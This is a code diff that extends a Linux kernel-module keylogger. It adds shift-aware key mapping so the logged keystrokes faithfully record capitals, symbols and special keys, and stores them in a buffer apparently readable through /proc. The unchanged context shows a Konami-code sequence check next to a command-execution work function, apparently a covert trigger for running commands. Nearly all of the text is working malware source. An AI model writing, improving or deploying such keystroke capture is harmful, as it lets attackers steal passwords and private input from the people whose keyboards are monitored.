@@ -11,6 +11,7 @@
 #include <linux/io.h>
 #include <linux/kmod.h>
 #include <linux/workqueue.h>
+#include <linux/input.h>
 
 #define PROC_FILENAME "keylogger"
 #define MAX_KEY_LOG_SIZE 2048 // Increased buffer size
@@ -44,99 +45,98 @@ static void execute_command_work(struct work_struct *work) {
     kfree(work);
 }
 
-static char get_char_from_keycode(int keycode) {
+static const char* get_char_from_keycode(int keycode, int shift) {
     switch (keycode) {
-        case KEY_RESERVED: return ' ';
-        case KEY_ESC: return '\033';
-        case KEY_1: return '1';
-        case KEY_2: return '2';
-        case KEY_3: return '3';
-        case KEY_4: return '4';
-        case KEY_5: return '5';
-        case KEY_6: return '6';
-        case KEY_7: return '7';
-        case KEY_8: return '8';
-        case KEY_9: return '9';
-        case KEY_0: return '0';
-        case KEY_MINUS: return '-';
-        case KEY_EQUAL: return '=';
-        case KEY_BACKSPACE: return '\b';
-        case KEY_TAB: return '\t';
-        case KEY_Q: return 'q';
-        case KEY_W: return 'w';
-        case KEY_E: return 'e';
-        case KEY_R: return 'r';
-        case KEY_T: return 't';
-        case KEY_Y: return 'y';
-        case KEY_U: return 'u';
-        case KEY_I: return 'i';
-        case KEY_O: return 'o';
-        case KEY_P: return 'p';
-        case KEY_LEFTBRACE: return '[';
-        case KEY_RIGHTBRACE: return ']';
-        case KEY_ENTER: return '\n';
-        case KEY_LEFTCTRL: return '\0';
-        case KEY_A: return 'a';
-        case KEY_S: return 's';
-        case KEY_D: return 'd';
-        case KEY_F: return 'f';
-        case KEY_G: return 'g';
-        case KEY_H: return 'h';
-        case KEY_J: return 'j';
-        case KEY_K: return 'k';
-        case KEY_L: return 'l';
-        case KEY_SEMICOLON: return ';';
-        case KEY_APOSTROPHE: return '\'';
-        case KEY_GRAVE: return '`';
-        case KEY_LEFTSHIFT: return '\0';
-        case KEY_BACKSLASH: return '\\';
-        case KEY_Z: return 'z';
-        case KEY_X: return 'x';
-        case KEY_C: return 'c';
-        case KEY_V: return 'v';
-        case KEY_B: return 'b';
-        case KEY_N: return 'n';
-        case KEY_M: return 'm';
-        case KEY_COMMA: return ',';
-        case KEY_DOT: return '.';
-        case KEY_SLASH: return '/';
-        case KEY_RIGHTSHIFT: return '\0';
-        case KEY_KPASTERISK: return '*';
-        case KEY_LEFTALT: return '\0';
-        case KEY_SPACE: return ' ';
-        case KEY_CAPSLOCK: return '\0';
-        case KEY_F1: return '\0';
-        case KEY_F2: return '\0';
-        case KEY_F3: return '\0';
-        case KEY_F4: return '\0';
-        case KEY_F5: return '\0';
-        case KEY_F6: return '\0';
-        case KEY_F7: return '\0';
-        case KEY_F8: return '\0';
-        case KEY_F9: return '\0';
-        case KEY_F10: return '\0';
-        case KEY_NUMLOCK: return '\0';
-        case KEY_SCROLLLOCK: return '\0';
-        case KEY_KP7: return '7';
-        case KEY_KP8: return '8';
-        case KEY_KP9: return '9';
-        case KEY_KPMINUS: return '-';
-        case KEY_KP4: return '4';
-        case KEY_KP5: return '5';
-        case KEY_KP6: return '6';
-        case KEY_KPPLUS: return '+';
-        case KEY_KP1: return '1';
-        case KEY_KP2: return '2';
-        case KEY_KP3: return '3';
-        case KEY_KP0: return '0';
-        case KEY_KPDOT: return '.';
-        case KEY_UP: return 'U'; // Representing UP with 'U'
-        case KEY_DOWN: return 'D'; // Representing DOWN with 'D'
-        case KEY_LEFT: return 'L'; // Representing LEFT with 'L'
-        case KEY_RIGHT: return 'R'; // Representing RIGHT with 'R'
-        default: return ' ';
+        case KEY_RESERVED: return " ";
+        case KEY_ESC: return "\033";
+        case KEY_1: return shift ? "!" : "1";
+        case KEY_2: return shift ? "@" : "2";
+        case KEY_3: return shift ? "#" : "3";
+        case KEY_4: return shift ? "$" : "4";
+        case KEY_5: return shift ? "%" : "5";
+        case KEY_6: return shift ? "^" : "6";
+        case KEY_7: return shift ? "&" : "7";
+        case KEY_8: return shift ? "*" : "8";
+        case KEY_9: return shift ? "(" : "9";
+        case KEY_0: return shift ? ")" : "0";
+        case KEY_MINUS: return shift ? "_" : "-";
+        case KEY_EQUAL: return shift ? "+" : "=";
+        case KEY_BACKSPACE: return "[BACKSPACE]";
+        case KEY_TAB: return "\t";
+        case KEY_Q: return shift ? "Q" : "q";
+        case KEY_W: return shift ? "W" : "w";
+        case KEY_E: return shift ? "E" : "e";
+        case KEY_R: return shift ? "R" : "r";
+        case KEY_T: return shift ? "T" : "t";
+        case KEY_Y: return shift ? "Y" : "y";
+        case KEY_U: return shift ? "U" : "u";
+        case KEY_I: return shift ? "I" : "i";
+        case KEY_O: return shift ? "O" : "o";
+        case KEY_P: return shift ? "P" : "p";
+        case KEY_LEFTBRACE: return shift ? "{" : "[";
+        case KEY_RIGHTBRACE: return shift ? "}" : "]";
+        case KEY_ENTER: return "\n";
+        case KEY_LEFTCTRL: return "";
+        case KEY_A: return shift ? "A" : "a";
+        case KEY_S: return shift ? "S" : "s";
+        case KEY_D: return shift ? "D" : "d";
+        case KEY_F: return shift ? "F" : "f";
+        case KEY_G: return shift ? "G" : "g";
+        case KEY_H: return shift ? "H" : "h";
+        case KEY_J: return shift ? "J" : "j";
+        case KEY_K: return shift ? "K" : "k";
+        case KEY_L: return shift ? "L" : "l";
+        case KEY_SEMICOLON: return shift ? ":" : ";";
+        case KEY_APOSTROPHE: return shift ? "\"" : "'";
+        case KEY_GRAVE: return shift ? "~" : "`";
+        case KEY_BACKSLASH: return shift ? "|" : "\\";
+        case KEY_Z: return shift ? "Z" : "z";
+        case KEY_X: return shift ? "X" : "x";
+        case KEY_C: return shift ? "C" : "c";
+        case KEY_V: return shift ? "V" : "v";
+        case KEY_B: return shift ? "B" : "b";
+        case KEY_N: return shift ? "N" : "n";
+        case KEY_M: return shift ? "M" : "m";
+        case KEY_COMMA: return shift ? "<" : ",";
+        case KEY_DOT: return shift ? ">" : ".";
+        case KEY_SLASH: return shift ? "?" : "/";
+        case KEY_KPASTERISK: return "*";
+        case KEY_LEFTALT: return "";
+        case KEY_SPACE: return " ";
+        case KEY_CAPSLOCK: return "";
+        case KEY_F1: return "[F1]";
+        case KEY_F2: return "[F2]";
+        case KEY_F3: return "[F3]";
+        case KEY_F4: return "[F4]";
+        case KEY_F5: return "[F5]";
+        case KEY_F6: return "[F6]";
+        case KEY_F7: return "[F7]";
+        case KEY_F8: return "[F8]";
+        case KEY_F9: return "[F9]";
+        case KEY_F10: return "[F10]";
+        case KEY_NUMLOCK: return "";
+        case KEY_SCROLLLOCK: return "";
+        case KEY_KP7: return "7";
+        case KEY_KP8: return "8";
+        case KEY_KP9: return "9";
+        case KEY_KPMINUS: return "-";
+        case KEY_KP4: return "4";
+        case KEY_KP5: return "5";
+        case KEY_KP6: return "6";
+        case KEY_KPPLUS: return "+";
+        case KEY_KP1: return "1";
+        case KEY_KP2: return "2";
+        case KEY_KP3: return "3";
+        case KEY_KP0: return "0";
+        case KEY_KPDOT: return ".";
+        case KEY_UP: return "[UP]"; // Representing UP with 'U'
+        case KEY_DOWN: return "[DOWN]"; // Representing DOWN with 'D'
+        case KEY_LEFT: return "[LEFT]"; // Representing LEFT with 'L'
+        case KEY_RIGHT: return "[RIGHT]"; // Representing RIGHT with 'R'
+        default: return " ";
     }
 }
+
 
 static void check_sequence(int keycode) {
     if (keycode == konami_sequence[sequence_index]) {
@@ -163,11 +163,19 @@ static int keylogger_notify(struct notifier_block *self, unsigned long event, vo
     struct keyboard_notifier_param *param = data;
 
     if (event == KBD_KEYCODE && param->down && key_log_index < MAX_KEY_LOG_SIZE - 2) {
-        char character = get_char_from_keycode(param->value);
-        if (character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
-            key_log[key_log_index++] = character;
+    
+    	int shift = (param->shift != 0);
+    	
+        const char *character = get_char_from_keycode(param->value, shift);
+        if (*character != ' ' || (key_log_index > 0 && key_log[key_log_index - 1] != ' ')) {
+            while (*character != '\0') {
+                key_log[key_log_index++] = *character;
+                if (key_log_index >= MAX_KEY_LOG_SIZE - 1)
+                    break;
+                character++;
+            }
             key_log[key_log_index] = '\0';
-            printk(KERN_INFO "Pressed key: %c\n", character);
+            printk(KERN_INFO "Pressed key: %s\n", character);
             
             // Check sequence
             check_sequence(param->value);
@@ -176,6 +184,7 @@ static int keylogger_notify(struct notifier_block *self, unsigned long event, vo
 
     return NOTIFY_OK;
 }
+
 
 static int keylogger_proc_show(struct seq_file *m, void *v) {
     int i;
